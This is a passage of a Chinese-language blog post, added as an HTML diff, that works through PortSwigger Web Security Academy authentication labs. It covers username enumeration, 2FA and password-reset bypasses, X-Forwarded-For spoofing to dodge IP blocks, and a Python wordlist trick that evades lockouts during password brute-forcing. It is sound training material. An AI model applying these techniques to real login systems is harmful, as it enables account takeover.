@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的鉴权漏洞（Authentication Vulner">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy 鉴权漏洞">
+<meta property="og:url" content="https://secdroid.github.io/2025/01/13/burp-web-academy-authentication/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的鉴权漏洞（Authentication Vulner">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://secdroid.github.io/images/burp-suite-intruder-columns-response-received.png">
+<meta property="og:image" content="https://secdroid.github.io/images/burp-suite-intruder-pitchfork-attack.png">
+<meta property="og:image" content="https://secdroid.github.io/images/burp-suite-intruder-request-in-browser.png">
+<meta property="article:published_time" content="2025-01-13T15:49:56.589Z">
+<meta property="article:modified_time" content="2025-01-13T15:51:55.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="Burp">
+<meta property="article:tag" content="Authentication">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://secdroid.github.io/images/burp-suite-intruder-columns-response-received.png">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/01/13/burp-web-academy-authentication/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/01/13/burp-web-academy-authentication/","path":"2025/01/13/burp-web-academy-authentication/","title":"Burp Web Academy 鉴权漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy 鉴权漏洞 | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E9%89%B4%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">0x02. 鉴权漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-Username-enumeration-via-different-responses"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: Username enumeration via different responses</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-2FA-simple-bypass"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: 2FA simple bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-Password-reset-broken-logic"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: Password reset broken logic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Lab-Username-enumeration-via-subtly-different-responses"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 Lab: Username enumeration via subtly different responses</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Lab-Username-enumeration-via-response-timing"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 Lab: Username enumeration via response timing</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-Lab-Broken-brute-force-protection-IP-block"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 Lab: Broken brute-force protection, IP block</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-Lab-Username-enumeration-via-account-lock"><span class="nav-number">2.7.</span> <span class="nav-text">2.7 Lab: Username enumeration via account lock</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-Lab-2FA-broken-logic"><span class="nav-number">2.8.</span> <span class="nav-text">2.8 Lab: 2FA broken logic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-9-Lab-Brute-forcing-a-stay-logged-in-cookie"><span class="nav-number">2.9.</span> <span class="nav-text">2.9 Lab: Brute-forcing a stay-logged-in cookie</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">4.</span> <span class="nav-text">0x04. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/01/13/burp-web-academy-authentication/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy 鉴权漏洞 | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy 鉴权漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-01-13 23:49:56 / 修改时间：23:51:55" itemprop="dateCreated datePublished" datetime="2025-01-13T23:49:56+08:00">2025-01-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的鉴权漏洞（Authentication Vulnerabilities）章节。</p>
+<span id="more"></span>
+
+<h2 id="0x02-鉴权漏洞"><a href="#0x02-鉴权漏洞" class="headerlink" title="0x02. 鉴权漏洞"></a>0x02. 鉴权漏洞</h2><h3 id="2-1-Lab-Username-enumeration-via-different-responses"><a href="#2-1-Lab-Username-enumeration-via-different-responses" class="headerlink" title="2.1 Lab: Username enumeration via different responses"></a>2.1 Lab: Username enumeration via different responses</h3><blockquote>
+<p>This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-usernames">Candidate usernames</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+<p>To solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page.</p>
+</blockquote>
+<p>给定了用户名字典、密码字典，分两步操作：</p>
+<ul>
+<li>首先，确认用户名是哪一个</li>
+<li>其次，爆破密码</li>
+</ul>
+<p>输入任意的用户名和密码，提示 <code>Invalid username</code>。因此，可以先爆破用户名，根据返回的页面 BODY 是否包含 <code>Invalid username</code> 来确认真正的用户名。</p>
+<ul>
+<li>选中登录的 POST 请求，选择 <code>Send to Intruder</code></li>
+<li>在 Intruder 中，先清理掉自动设置的字段，仅将 <code>username</code> 设置为字段</li>
+<li>将用户名字典导入到 <code>Payload</code> 页面下的 <code>Payload Options</code> 中</li>
+<li>在 <code>Options</code> 页面中设置 <code>Grep - Match</code> 匹配选项 <code>Invalid username</code></li>
+</ul>
+<p>然后点击 <code>Start attack</code> 开始爆破，很快就可以确认用户名是 <code>applications</code>，而密码错误的提示是 <code>Incorrect password</code>。使用同样的方法，可以对密码进行爆破，结果为 <code>123456</code>。</p>
+<h3 id="2-2-Lab-2FA-simple-bypass"><a href="#2-2-Lab-2FA-simple-bypass" class="headerlink" title="2.2 Lab: 2FA simple bypass"></a>2.2 Lab: 2FA simple bypass</h3><blockquote>
+<p>This lab’s two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user’s 2FA verification code. To solve the lab, access Carlos’s account page.</p>
+<ul>
+<li>Your credentials: <code>wiener:peter</code></li>
+<li>Victim’s credentials <code>carlos:montoya</code></li>
+</ul>
+</blockquote>
+<p>先使用 <code>wiener:peter</code> 登录，需要输入动态口令，后者可以通过 <code>Email client</code> 中的邮件查看，而完成登陆后，则可以修改自己的 Email，原本的邮件地址是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wiener@exploit-0a86006803574d84814d446001b40022.exploit-server.net</span><br></pre></td></tr></table></figure>
+
+<p>尝试把 <code>wiener</code> 的邮件地址改为 <code>carlos@xxx</code>，尝试用 <code>wiener</code> 的验证码登录，发现验证码绑定了账户，会直接登录 <code>wiener</code> 的账户。此外，还有一个 Exploit Server，没看出来有什么用。</p>
+<p>看了提示，发现解法非常简单：</p>
+<ul>
+<li>登录 <code>wiener</code>，使用验证码进入后，确认个人页面的 URI 为 <code>/my-account</code></li>
+<li>登录 <code>carlos</code>，在需要输入验证码的时候，直接访问 <code>/my-account</code></li>
+</ul>
+<h3 id="2-3-Lab-Password-reset-broken-logic"><a href="#2-3-Lab-Password-reset-broken-logic" class="headerlink" title="2.3 Lab: Password reset broken logic"></a>2.3 Lab: Password reset broken logic</h3><blockquote>
+<p>This lab’s password reset functionality is vulnerable. To solve the lab, reset Carlos’s password then log in and access his “My account” page.</p>
+<ul>
+<li>Your credentials: <code>wiener:peter</code></li>
+<li>Victim’s username: <code>carlos</code></li>
+</ul>
+</blockquote>
+<p>进入登陆页面，发现有一个重置密码的链接，访问后可以通过用户名或者邮箱来找回密码，先测试下 <code>wiener</code>，通过邮箱中的链接重置密码，实际重置密码的表单内容如下所示：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">login-form</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">hidden</span> <span class="attr">name</span>=<span class="string">temp-forgot-password-token</span> <span class="attr">value</span>=<span class="string">0u0qduy35wud8ofrgoyk3ri97z5ft1wd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">hidden</span> <span class="attr">name</span>=<span class="string">username</span> <span class="attr">value</span>=<span class="string">wiener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>New password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">new-password-1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Confirm new password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">new-password-2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span>&gt;</span> Submit <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中有两个隐藏的字段，一个是重置密码用的 Token，另一个是 Username，尝试把这里的用户名修改为 <code>carlos</code>，提交表单即可修改 <code>carlos</code> 的密码。</p>
+<h3 id="2-4-Lab-Username-enumeration-via-subtly-different-responses"><a href="#2-4-Lab-Username-enumeration-via-subtly-different-responses" class="headerlink" title="2.4 Lab: Username enumeration via subtly different responses"></a>2.4 Lab: Username enumeration via subtly different responses</h3><blockquote>
+<p>This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-usernames">Candidate usernames</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+<p>To solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page.</p>
+</blockquote>
+<p>跟前面的题不太一样，随意输入用户名和密码，登录失败时返回 <code>Invalid username or password.</code>。还是使用 Intruder 来爆破以下用户名，观察返回结果有何不同之处：用户名 <code>atlas</code> 返回了 <code>Invalid username or password </code>，末尾是空格而不是 <code>.</code>。</p>
+<p>之后，尝试给 <code>atlas</code> 爆破密码，根据返回结果的长度或者状态码，可以很快确定密码是 <code>joshua</code>。</p>
+<h3 id="2-5-Lab-Username-enumeration-via-response-timing"><a href="#2-5-Lab-Username-enumeration-via-response-timing" class="headerlink" title="2.5 Lab: Username enumeration via response timing"></a>2.5 Lab: Username enumeration via response timing</h3><blockquote>
+<p>This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page.</p>
+<ul>
+<li>Your credentials: <code>wiener:peter</code></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-usernames">Candidate usernames</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+</blockquote>
+<p>根据服务器的响应时间来确认真实的账户名称，把 POST 登录请求包发送到 Intruder 进行爆破处理，但是有两点需要注意。</p>
+<p>首先，Burp 的 Intruder 默认不会展示服务器的响应时间，需要在 <strong>Intruder 攻击完毕的窗口中通过菜单项</strong>选择开启：点击 <code>Columns</code> 菜单项，然后依次选择 <code>Response received</code> 和 <code>Response completed</code>。说实话，这个顶部的菜单栏放到了标题栏里面，看着有点迷糊，找了好久才发现。</p>
+<p><img src="/images/burp-suite-intruder-columns-response-received.png" alt="Burp Suite Intruder 展示服务器响应时间"></p>
+<p>其次，当我们发送大量登录请求时，会被服务器检测出来，提示 30 分钟之后再尝试登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have made too many incorrect login attempts. Please try again in 30 minute(s).</span><br></pre></td></tr></table></figure>
+
+<p>这需要我们调整攻击策略：在 Intruder 中，将 <code>Attack type</code> 从 <code>Sniper</code> 改为 <code>Pitchfork</code>，这允许我们为不同的字段指定不同的攻击字典。</p>
+<p><img src="/images/burp-suite-intruder-pitchfork-attack.png" alt="Burp Suite Intruder 调整 Pitchfork 攻击类型"></p>
+<p>我们可以通过 <code>X-Forwarded-For</code> 字段来变更 IP 地址，实现 IP 拦截绕过。由于用户名大概只有 <code>100</code> 个，因此可以直接以数字形式迭代 IP 地址 <code>X-Forwarded-For: 222.222.222.§1§</code>。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a39005b040d76aa830c4cbe00dd0027.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=4KAdUGJ6YxsvagQcTdAyMnxSxlSRAdcI</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;105&quot;, &quot;Not)A;Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0a39005b040d76aa830c4cbe00dd0027.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0a39005b040d76aa830c4cbe00dd0027.web-security-academy.net/login</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>222.222.222.§1§</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">username</span>=§username§&amp;password=password</span></span><br></pre></td></tr></table></figure>
+
+<p>完成攻击后，可以通过 <code>Response received</code> 排序，然后快速确认哪些请求耗时过长。当然，响应时间存在多方面的影响，所以最好多试几次，找出总是耗时很长的响应。确认用户名之后，使用同样的策略对密码进行爆破，根据响应的状态码来确认密码是否正确。</p>
+<p>还有一个需要注意的点：默认的发包模式是 <code>10</code> 个并发请求，且两个包之间没有时间间隔，这可能给响应时间带来影响，可以尝试调整这个发包策略。</p>
+<h3 id="2-6-Lab-Broken-brute-force-protection-IP-block"><a href="#2-6-Lab-Broken-brute-force-protection-IP-block" class="headerlink" title="2.6 Lab: Broken brute-force protection, IP block"></a>2.6 Lab: Broken brute-force protection, IP block</h3><blockquote>
+<p>This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim’s password, then log in and access their account page.</p>
+<ul>
+<li>Your credentials: <code>wiener:peter</code></li>
+<li>Victim’s username: <code>carlos</code></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+</blockquote>
+<p>同样存在 IP 拉黑操作，而且 <code>X-Forwarded-For</code> 也没有用，大概是连续 <code>2</code> 次失败，就会提示如下错误信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have made too many incorrect login attempts. Please try again in 1 minute(s).</span><br></pre></td></tr></table></figure>
+
+<p>尝试生成用户名和密码字典，每次尝试爆破 <code>carlos</code> 密码之后，立即使用 <code>wiener</code> 登陆一次，看是否可以绕过这里的限制：</p>
+<ul>
+<li>测试之后，发现很快还是被拉黑了</li>
+<li>查看官方答案，发现思路是对的，但是忘了默认的发包模式是 <code>10</code> 个并发请求，这里需要改为 <code>1</code> 个，防止产生干扰</li>
+</ul>
+<p>之后在 Intruder 发包爆破，可以确认 <code>carlos</code> 的密码是 <code>love</code>，生成 Payload 的 Python 代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen_dict</span>(<span class="params">pwdfile</span>):</span><br><span class="line">    lines = <span class="built_in">open</span>(pwdfile, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">    fuser = <span class="built_in">open</span>(<span class="string">&#x27;username.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    fpwd = <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        fuser.write(<span class="string">&#x27;wiener\n&#x27;</span>)</span><br><span class="line">        fpwd.write(<span class="string">&#x27;peter\n&#x27;</span>)</span><br><span class="line">        fuser.write(<span class="string">&#x27;carlos\n&#x27;</span>)</span><br><span class="line">        fpwd.write(<span class="string">&#x27;%s\n&#x27;</span> % line.strip())</span><br><span class="line">    fuser.close()</span><br><span class="line">    fpwd.close()</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-7-Lab-Username-enumeration-via-account-lock"><a href="#2-7-Lab-Username-enumeration-via-account-lock" class="headerlink" title="2.7 Lab: Username enumeration via account lock"></a>2.7 Lab: Username enumeration via account lock</h3><blockquote>
+<p>This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page.</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-usernames">Candidate usernames</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+</blockquote>
+<p>在 Intruder 中，直接选择 <code>Cluster bomb</code> 模式，尝试所有的用户名和密码枚举，直接就给爆破了：</p>
+<ul>
+<li><code>Invalid username or password.</code> 表示用户名或者密码错误</li>
+<li><code>You have made too many incorrect login attempts. Please try again in 1 minute(s).</code> 表示用户名存在，但密码连续多次错误</li>
+<li>剩下的一个，就是正确的用户名和密码了</li>
+</ul>
+<p>当然，这样的爆破搞下来就得发送上万次的 POST 请求包，其实可以尝试剪枝优化：</p>
+<ul>
+<li>每一个用户名，只尝试少量登录尝试，比如 <code>10</code> 次登录，这样遇到不一样的错误，大概就是用户名存在，后面就不用测了<ul>
